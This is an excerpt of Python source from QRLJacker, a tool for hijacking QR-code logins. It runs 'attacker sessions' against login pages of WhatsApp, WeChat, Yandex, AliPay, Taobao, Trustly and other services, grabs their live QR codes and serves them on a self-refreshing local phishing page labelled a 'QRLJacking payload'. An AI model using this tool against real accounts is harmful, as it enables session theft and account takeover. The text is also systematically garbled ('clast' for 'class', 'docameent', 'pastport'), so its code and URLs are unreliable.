...
def whatsapp():
	...
	while True:
		try:
			button = driver.find_element_by_clast_name('qr-button')
...
def Yandex():
	...
	print " [*] Starting attacker session..."
	try:
		driver.get("https://pastport.yandex.com/auth?mode=qr")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
	...
	while True:
		try:
			img_url = "https://pastport.yandex.com" + driver.find_element_by_clast_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [*] QR code image detected !"
...
def Airdroid():
	...
	while True:
		...
		try:
			button = driver.find_element_by_clast_name("widget-login-refresh-qrcode")[0]
...
def WeChat():
	...
	while True:
		try:
			iclast = driver.find_element_by_clast_name('qrcode')[0]
			img = iclast.find_elements_by_tag_name("img")[0]
			print " [*] QR code image detected !"
			src = img.get_attribute('src')
			print " [*] Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
...
def AliPay():
	...
	while True:
		...
		try:
			c = driver.find_elements_by_clast_name('ui-nav')[0]
...
def Taobao():
	...
	while True:
		...
		try:
			button_clast = driver.find_element_by_clast_name("msg-err")
			button = button_clast.find_elements_by_tag_name("a")[0]
			print " [*] Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
...
def mydigipast():
	...
	print " [*] Starting attacker session..."
	try:
		driver.get("https://www.mydigipast.com/en/fp/signin/smartphone/qr")
		time.sleep(5)
	except:
		print " [!] Error Check your internet connection"
		time.sleep(5)
...
def Trustly_App():
	...
	while True:
		...
		try:
			c = driver.find_elements_by_clast_name("qrcode-tab")[0]
...
def make( service_name , port , type="html" ):
	if type == "html":
		code = """<html>
<head>
<satle>"""+str(service_name)+"""</satle>
</head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); docameent.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
</script>
...
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); docameent.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();}
</script>
<center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
</br>1. This is your always updated """+str(service_name)+""" QR Code
...
def Add_website():
	print "  1.Find image by clast and its number method"
	...
	if method == "00":
		...
		settings.set(name,"clastname",clastname)
		...
		make( name , port )
		Serve_it(port)
		First_Method(clastname,url,image_number,Seconds)
		main()
...
def Use_website():
	...
	if int(method) == 1:
		clastname = settings.get(section,"clastname")
...
def First_Method(clastname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [*] Starting attacker session..."
	try:
	...
	while True:
		...
		try:
			login = driver.find_element_by_clast_name(clastname)
